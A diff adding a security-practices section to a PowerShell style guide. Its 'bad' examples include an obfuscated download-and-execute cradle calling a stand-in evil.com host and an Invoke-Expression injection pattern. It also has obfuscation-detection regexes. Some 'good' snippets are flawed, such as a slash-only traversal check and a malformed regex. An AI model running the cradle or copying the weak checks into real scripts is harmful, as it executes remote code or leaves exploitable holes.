@@ -769,6 +769,408 @@ New-ADUser @userParams
 
 ---
 
+## Security Best Practices
+
+### Execution Policy and Script Signing
+
+Use proper execution policies and sign scripts:
+
+```powershell
+## Bad - Bypassing execution policy
+PowerShell.exe -ExecutionPolicy Bypass -File script.ps1  # ❌ Security risk!
+
+## Good - Use RemoteSigned or AllSigned
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
+
+## Good - Sign scripts
+$cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
+Set-AuthenticodeSignature -FilePath .\script.ps1 -Certificate $cert
+
+## Good - Verify signature before execution
+$signature = Get-AuthenticodeSignature -FilePath .\script.ps1
+if ($signature.Status -ne 'Valid') {
+    throw "Script signature is invalid!"
+}
+```
+
+**Key Points**:
+
+- Never use `-ExecutionPolicy Bypass` in production
+- Sign all production scripts
+- Use `AllSigned` policy for maximum security
+- Verify signatures before execution
+- Store code signing certificates securely
+- Use timestamp servers when signing
+
+### Secure Credential Management
+
+Never hardcode credentials:
+
+```powershell
+## Bad - Hardcoded credentials
+$username = "admin"
+$password = "Password123"  # ❌ Exposed!
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
+
+## Good - Use Get-Credential
+$credential = Get-Credential -UserName "admin" -Message "Enter password"
+
+## Good - Use Secret Management module
+Install-Module -Name Microsoft.PowerShell.SecretManagement
+Install-Module -Name SecretManagement.Keychain  # macOS
+# Or: SecretManagement.KeePass, SecretManagement.LastPass
+
+Set-Secret -Name "ServiceAccount" -Secret (Get-Credential)
+$credential = Get-Secret -Name "ServiceAccount" -AsPlainText
+
+## Good - Azure Key Vault
+$secret = Get-AzKeyVaultSecret -VaultName "MyVault" -Name "DbPassword"
+$credential = New-Object PSCredential("admin", $secret.SecretValue)
+
+## Good - Never log credentials
+function Connect-Database {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [PSCredential]$Credential
+    )
+    # Credential automatically masked in verbose output
+    Write-Verbose "Connecting as $($Credential.UserName)"  # ✅ Password not logged
+}
+```
+
+**Key Points**:
+
+- Never hardcode passwords in scripts
+- Use `PSCredential` objects
+- Use Secret Management modules
+- Leverage cloud secret stores (Azure Key Vault, AWS Secrets Manager)
+- Never log or display `SecureString` values
+- Rotate credentials regularly
+
+### Input Validation and Injection Prevention
+
+Validate all inputs to prevent injection attacks:
+
+```powershell
+## Bad - No validation (injection risk)
+param($Username)
+Invoke-Expression "net user $Username /delete"  # ❌ Command injection!
+
+## Good - Validate inputs
+param(
+    [Parameter(Mandatory)]
+    [ValidatePattern('^[a-zA-Z0-9_-]+$')]
+    [ValidateLength(1, 20)]
+    [string]$Username
+)
+Remove-LocalUser -Name $Username  # ✅ Safe cmdlet
+
+## Good - Use parameter validation
+function Remove-UserAccount {
+    param(
+        [Parameter(Mandatory)]
+        [ValidateSet('Dev', 'Test', 'Prod')]
+        [string]$Environment,
+
+        [Parameter(Mandatory)]
+        [ValidateScript({
+            if ($_ -match '^[a-zA-Z0-9_-]+$') { $true }
+            else { throw "Invalid username format" }
+        })]
+        [string]$Username
+    )
+
+    Remove-LocalUser -Name $Username
+}
+
+## Good - Avoid Invoke-Expression
+## Bad
+$command = "Get-Process -Name $processName"  # User input
+Invoke-Expression $command  # ❌ Code injection!
+
+## Good
+Get-Process -Name $processName  # ✅ Direct cmdlet call
+```
+
+**Key Points**:
+
+- Always validate user inputs
+- Use `ValidatePattern`, `ValidateSet`, `ValidateScript`
+- Never use `Invoke-Expression` with user input
+- Use cmdlets instead of string commands
+- Sanitize inputs before file operations
+- Use parameter binding, not string concatenation
+
+### Secure File Operations
+
+Prevent path traversal and unauthorized file access:
+
+```powershell
+## Bad - Path traversal vulnerability
+param($FileName)
+$content = Get-Content "C:\Data\$FileName"  # ❌ Can access ../../../Windows/System32
+
+## Good - Validate and resolve paths
+param(
+    [Parameter(Mandatory)]
+    [ValidateScript({
+        if ($_ -notmatch '\.\./') { $true }
+        else { throw "Path traversal detected" }
+    })]
+    [string]$FileName
+)
+
+$basePath = "C:\Data"
+$fullPath = Join-Path $basePath $FileName | Resolve-Path
+if (-not $fullPath.Path.StartsWith($basePath)) {
+    throw "Access denied: path outside allowed directory"
+}
+$content = Get-Content $fullPath
+
+## Good - Set restrictive file permissions
+$acl = Get-Acl "C:\Secrets\config.json"
+$acl.SetAccessRuleProtection($true, $false)  # Disable inheritance
+$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+    "BUILTIN\Administrators", "FullControl", "Allow"
+)
+$acl.AddAccessRule($rule)
+Set-Acl "C:\Secrets\config.json" $acl
+
+## Good - Verify checksums
+function Get-FileIfValid {
+    param(
+        [string]$Url,
+        [string]$ExpectedHash
+    )
+
+    $tempFile = New-TemporaryFile
+    Invoke-WebRequest -Uri $Url -OutFile $tempFile
+
+    $actualHash = (Get-FileHash $tempFile -Algorithm SHA256).Hash
+    if ($actualHash -ne $ExpectedHash) {
+        Remove-Item $tempFile
+        throw "Hash mismatch! File may be tampered."
+    }
+
+    return $tempFile
+}
+```
+
+**Key Points**:
+
+- Validate file paths to prevent traversal
+- Use `Resolve-Path` and verify resolved paths
+- Set appropriate ACLs on sensitive files
+- Verify file hashes after download
+- Never trust user-provided paths
+- Use temporary files for downloads
+
+### Least Privilege Execution
+
+Run scripts with minimal required privileges:
+
+```powershell
+## Bad - Requiring admin for everything
+#Requires -RunAsAdministrator
+# Entire script runs as admin even if not needed
+
+## Good - Check and request elevation only when needed
+function Install-Application {
+    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator
+    )) {
+        throw "This function requires administrator privileges"
+    }
+
+    # Admin-only operations here
+}
+
+## Good - Use RunAs for specific commands
+$credential = Get-Credential
+Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {
+    Install-WindowsFeature -Name Web-Server
+}
+
+## Good - Separate privileged and non-privileged operations
+function Deploy-Application {
+    # Non-privileged operations
+    Test-Configuration
+    Build-Application
+
+    # Only elevate for installation
+    if (Test-IsAdmin) {
+        Install-Service
+    } else {
+        Write-Warning "Run as administrator to install service"
+    }
+}
+```
+
+**Key Points**:
+
+- Don't require admin unless absolutely necessary
+- Check for admin rights before privileged operations
+- Use `Invoke-Command` with credentials for remote operations
+- Separate privileged and non-privileged code
+- Document why elevation is needed
+- Use service accounts with minimal permissions
+
+### Network Security
+
+Secure network operations:
+
+```powershell
+## Bad - Insecure HTTP
+Invoke-WebRequest -Uri "http://api.example.com/data"  # ❌ Unencrypted!
+
+## Good - Use HTTPS
+Invoke-WebRequest -Uri "https://api.example.com/data"
+
+## Good - Verify SSL certificates
+try {
+    Invoke-WebRequest -Uri "https://api.example.com/data" `
+        -ErrorAction Stop  # Will fail on invalid certs
+} catch {
+    Write-Error "SSL certificate validation failed: $_"
+}
+
+## Good - Use authentication headers securely
+$token = Get-Secret -Name "ApiToken" -AsPlainText
+$headers = @{
+    "Authorization" = "Bearer $token"
+}
+Invoke-RestMethod -Uri "https://api.example.com/data" -Headers $headers
+
+## Good - Limit TLS versions
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor `
+    [Net.SecurityProtocolType]::Tls13
+```
+
+**Key Points**:
+
+- Always use HTTPS for network requests
+- Verify SSL/TLS certificates
+- Use TLS 1.2 or higher
+- Never disable certificate validation
+- Use secure authentication (OAuth, API keys from vaults)
+- Implement request timeouts
+
+### Audit Logging
+
+Log security-relevant operations:
+
+```powershell
+## Good - Comprehensive logging
+function Remove-UserAccount {
+    [CmdletBinding(SupportsShouldProcess)]
+    param(
+        [Parameter(Mandatory)]
+        [string]$Username
+    )
+
+    $auditLog = "C:\Logs\audit.log"
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $user = $env:USERNAME
+    $computer = $env:COMPUTERNAME
+
+    $logEntry = "$timestamp | $computer | $user | Attempting to remove user: $Username"
+    Add-Content -Path $auditLog -Value $logEntry
+
+    try {
+        if ($PSCmdlet.ShouldProcess($Username, "Remove user account")) {
+            Remove-LocalUser -Name $Username -ErrorAction Stop
+            $logEntry = "$timestamp | $computer | $user | SUCCESS: Removed user: $Username"
+            Add-Content -Path $auditLog -Value $logEntry
+        }
+    } catch {
+        $logEntry = "$timestamp | $computer | $user | FAILED: $($_.Exception.Message)"
+        Add-Content -Path $auditLog -Value $logEntry
+        throw
+    }
+}
+
+## Good - Use Windows Event Log
+function Write-SecurityEvent {
+    param(
+        [string]$Message,
+        [ValidateSet('Information', 'Warning', 'Error')]
+        [string]$Level = 'Information'
+    )
+
+    Write-EventLog -LogName Application `
+        -Source "MyApplication" `
+        -EntryType $Level `
+        -EventId 1000 `
+        -Message $Message
+}
+```
+
+**Key Points**:
+
+- Log all security-relevant operations
+- Include timestamps, user, and computer
+- Log both successes and failures
+- Use Windows Event Log for system-level events
+- Protect log files with appropriate ACLs
+- Implement log rotation
+- Monitor logs for suspicious activity
+
+### Script Obfuscation Detection
+
+Avoid and detect obfuscated scripts:
+
+```powershell
+## Bad - Obfuscated code (red flag!)
+$a='I'+'E'+'X';$b='(Ne'+'w-Ob'+'ject Ne'+'t.WebC'+'lient).Dow'+'nloadStr'+'ing';
+&$a($b+"('http://evil.com/payload.ps1')")  # ❌ Malicious obfuscation!
+
+## Good - Clear, readable code
+$client = New-Object Net.WebClient
+$script = $client.DownloadString('https://trusted-site.com/script.ps1')
+# Verify hash before executing
+$expectedHash = "ABC123..."
+$stream = [IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($script))
+if ((Get-FileHash -InputStream $stream).Hash -eq $expectedHash) {
+    Invoke-Expression $script
+}
+
+## Good - Detect obfuscation
+function Test-ScriptObfuscation {
+    param([string]$ScriptPath)
+
+    $content = Get-Content $ScriptPath -Raw
+
+    $suspiciousPatterns = @(
+        '[char]\(\d+\)',  # Char code obfuscation
+        '\$\w+\s*=\s*[''"][^''"]+[''"]\s*\+',  # String concatenation obfuscation
+        '-join\s*\(',  # Join obfuscation
+        'iex|Invoke-Expression',  # Dynamic execution
+        '\[Convert\]::FromBase64String'  # Base64 encoding
+    )
+
+    foreach ($pattern in $suspiciousPatterns) {
+        if ($content -match $pattern) {
+            Write-Warning "Suspicious pattern detected: $pattern"
+            return $false
+        }
+    }
+    return $true
+}
+```
+
+**Key Points**:
+
+- Never obfuscate your own scripts
+- Detect and reject obfuscated scripts
+- Be suspicious of base64, char codes, string concatenation
+- Use PSScriptAnalyzer to detect suspicious patterns
+- Review scripts before execution
+- Implement application whitelisting
+
+---
+
 ## Tool Configurations
 
 ### VSCode settings.json
